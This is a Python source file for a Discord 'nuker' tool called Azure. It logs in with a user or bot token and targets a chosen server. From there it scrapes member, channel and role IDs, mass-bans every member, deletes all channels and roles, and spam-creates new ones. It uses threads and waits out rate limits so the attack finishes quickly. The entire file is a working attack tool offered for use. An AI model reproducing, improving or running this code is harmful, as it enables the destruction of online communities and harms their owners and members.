# -*-coding utf-8-*-

# ------ Imports ------ #

import os, time, threading, requests, discord, random
from time import sleep
from threading import Thread
from pystyle import System
from colorama import Fore
from itertools import cycle
from pypresence import Presence
from discord.ext import commands
from random import randint
from discord_webhook import DiscordWebhook

# ------ Ansi Colours ------ #

g = '\033[90m'
w = '\033[37m'
b = '\033[0;34m'
re = '\033[0m'

# ------ Misc ------ #

ban_reason = "Azure! ~ XyloW LawaholicW"
session = requests.Session()

status_codes = [200, 201, 204]
status_code = [400, 429]

def clear():
    os.system('cls||clear')

def exit():
    print(f"{b}> {w}Exiting{b}. . . {w}")
    sleep(1)
    os._exit(0)

# ------ Rich Presence ------ #

client = '969416672840671284'
RPC = Presence(client)
RPC.connect()
RPC.update(large_image = "pfp", details = 'Main Menu', start=time.time())

# ------ Token & Guild Login ------ #

os.system('cls & mode 80, 20 & title Azure - Login : Token')
token = input(f"{b}> {w}Token{b}: {w}")
System.Clear()

os.system('cls & mode 80, 20 & title Azure - Login : Guild')
guild = int(input(f"{b}> {w}Guild{b}: {w}"))
System.Clear()

# ------ Token Checker ------ #

prefix = 'Azure!'

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if check_token(token) == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True,intents = discord.Intents.all())
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False,intents = discord.Intents.all())
    
client.remove_command("help")

# ------ Azure Main ------ #

class AzureMisc:

    def AzureBan(guild, member):
        try:
            api = f"https://discord.com/api/v8/guilds/{guild}/bans/{member}?reason={ban_reason}"
            r = session.put(api, headers=headers)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Banned{b}: {w}{member}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Ban{b}: {w}{member}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass

    def AzureSpamChan(guild, name):
        try:
            payload = {
                'name': name
            }
            api = f"https://discord.com/api/v8/guilds/{guild}/channels"
            r = session.post(api, headers=headers, json=payload)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Created{b}: {w}{name}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Create{b}: {w}{name}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass

    def AzureSpamRoles(guild, name):
        try:
            payload = {
                'name': name,
                'color': random.randint(1000000,9999999)
            }
            api = f"https://discord.com/api/v8/guilds/{guild}/roles"
            r = session.post(api, headers=headers, json=payload)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Created{b}: {w}{name}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Create{b}: {w}{name}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass

    def AzureDelChan(guild, channels):
        try:
            api = f"https://discord.com/api/v8/channels/{channels}"
            r = session.delete(api, headers=headers)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Deleted{b}: {w}{channels}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Delete{b}: {w}{channels}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass

    def AzureDelRoles(guild, role):
        try:
            api = f"https://discord.com/api/v8/guilds/{guild}/roles/{role}"
            r = session.delete(api, headers=headers)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Deleted{b}: {w}{role}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Delete{b}: {w}{role}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass  

    def AzureUnbanAll(guild, member):
        try:
            api = f"https://discord.com/api/v8/guilds/{guild}/bans/{member}"
            r = session.delete(api, headers=headers)
            username = client.get_user(member)
            if r.status_code in status_codes:
                print(f"{b}[{w}+{b}] {w}Unbanned{b}: {w}{member}")
            else:
                print(f"{b}[{w}!{b}] {w}Failed To Unban{b}: {w}{member}")
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{b}[{w}+{b}] {w}RateLimited{b}, {w}Retrying in{b}: {w}{r.json()['retry_after']} s.")
        except:
            pass             
            
    async def AzureScrape():
        try:
            os.remove("Scraped/Members.txt")
            os.remove("Scraped/Channels.txt")
            os.remove("Scraped/Roles.txt")
        except:
            pass
            

        membercount = 0
        with open('Scraped/Members.txt', 'a') as f:
            for member in guildobj.members:
                f.write(str(member.id) + "\n")
                membercount += 1
            print(f"{b}[{w}+{b}] {w}Successfully Scraped{b}: {w}{membercount} Members{b}! {w}")

        channelcount = 0
        with open('Scraped/Channels.txt', 'a') as f:
            for channel in guildobj.channels:
                f.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{b}[{w}+{b}] {w}Successfully Scraped{b}: {w}{channelcount} Channels{b}! {w}")
        
        rolecount = 0
        with open("Scraped/Roles.txt", "a")as f:
            for role in guildobj.roles:
                f.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{b}[{w}+{b}] {w}Successfully Scraped{b}: {w}{rolecount} Roles{b}! {w}")

@client.event
async def on_ready():
    os.system('cls||clear')
    global guildobj
    guildobj = client.get_guild(guild)
    await AzureMenu()  

async def AzureMenu():
    os.system('cls & mode 80, 20 & title Azure - Menu : Made By lawaholic#0001 + xylo#6666')
    print(f'''
                        {b}╔═╗╔═╗╦ ╦╦═╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                        {g}╠═╣╔═╝║ ║╠╦╝║╣   ║║║║ ║╠╩╗║╣ ╠╦╝
                        {w}╩ ╩╚═╝╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═
                   {b}──────────────────────────────────────────{w}
                    {b}────────────────────────────────────────{w}
                     {b}+────────────────────────────────────+{w}
                     {b}| {w}[{b}1{w}] Mass-Ban    {b}| {w}[{b}2{w}] Scrape       {b}|{w}
                     {b}| {w}[{b}3{w}] Spam-Chan   {b}| {w}[{b}4{w}] Del-Chan     {b}|{w}
                     {b}| {w}[{b}5{w}] Spam-Roles  {b}| {w}[{b}6{w}] Del-Roles    {b}|{w}
                     {b}+────────────────────────────────────+{w}
    {re}''') 

    x = input(f"{b}> {w}Option{b}: {w}")

    if x == '1' or x == '01':
            os.system('mode 80, 20 & title Azure - Banning : Scraped')
            print(f"{b}[{w}!{b}] {w}Banning Members{b}. . . {w}")
            sleep(0.5)
            members = []
            amount = 0
            a_file = open('Scraped/Members.txt','r')
            for line in a_file:
                stripped_line = line.strip()
                members.append(stripped_line)
            a_file.close()
            looping = True
            while looping:
                try:
                    threading.Thread(target = AzureMisc.AzureBan, args = (guild, members[amount],)).start()
                except:
                    looping = False
                amount += 1
            for member in members:
                threading.Thread(target = AzureMisc.AzureBan, args = (guild, member,)).start()   
            sleep(2.5)
            await AzureMenu()

    if x == '2' or x == '02':
        await client.wait_until_ready()
        await AzureMisc.AzureScrape()
        time.sleep(2)
        await AzureMenu()

    if x == '3' or x == '03':
            os.system('mode 80, 20 & title Azure - Creating : Channels')
            name = input(f"{b}> {w}Names{b}: {w}")  
            amount = input(f"{b}> {w}Amount{b}: {w}") 

            print(f"{b}[{w}!{b}] {w}Creating Channels{b}. . . {w}")
            sleep(0.5)

            for i in range(int(amount)):
                threading.Thread(target = AzureMisc.AzureSpamChan, args = (guild, name,)).start()
            sleep(2.5)
            await AzureMenu()

    if x == '4' or x == '04':
            os.system('mode 80, 20 & title Azure - Deleting : Channels')
            print(f"{b}[{w}!{b}] {w}Deleting Channels{b}. . . {w}")
            sleep(0.5)          
            channels = []
            b_file = open('Scraped/Channels.txt','r')
            cnum = 0
            for line in b_file:
                stripped_line = line.strip()
                channels.append(stripped_line)
            b_file.close()
            looping = True
            while looping:
                try:
                    threading.Thread(target = AzureMisc.AzureDelChan, args = (guild, channels[cnum])).start()
                except:
                    looping = False
                cnum += 1        
            sleep(2.5)
            await AzureMenu()

    if x == '5' or x == '05':
            os.system('mode 80, 20 & title Azure - Creating : Roles')
            name = input(f"{b}> {w}Names{b}: {w}")  
            amount = input(f"{b}> {w}Amount{b}: {w}")  

            print(f"{b}[{w}!{b}] {w}Creating Roles{b}. . . {w}")
            sleep(0.5)

            for i in range(int(amount)):
                threading.Thread(target = AzureMisc.AzureSpamRoles, args = (guild, name,)).start()
            sleep(2.5)
            await AzureMenu()

    if x == '6' or x == '06':
            os.system('mode 80, 20 & title Azure - Deleting : Roles')
            print(f"{b}[{w}!{b}] {w}Deleting Roles{b}. . . {w}")
            sleep(0.5)          
            roles = []
            b_file = open('Scraped/Roles.txt','r')
            rnum = 0
            for line in b_file:
                stripped_line = line.strip()
                roles.append(stripped_line)
            b_file.close()
            looping = True
            while looping:
                try:
                    threading.Thread(target = AzureMisc.AzureDelRoles, args = (guild, roles[rnum])).start()
                except:
                    looping = False
                rnum += 1        
            sleep(2.5)
            await AzureMenu()

try:
    if check_token(token) == "user":
        client.run(token, bot=False)
    elif check_token(token) == "bot":
        client.run(token)
except:
    print(f'{b}[{w}!{b}] {w}Invalid Token{b}! {w}')
    time.sleep(1)
    os._exit(0)    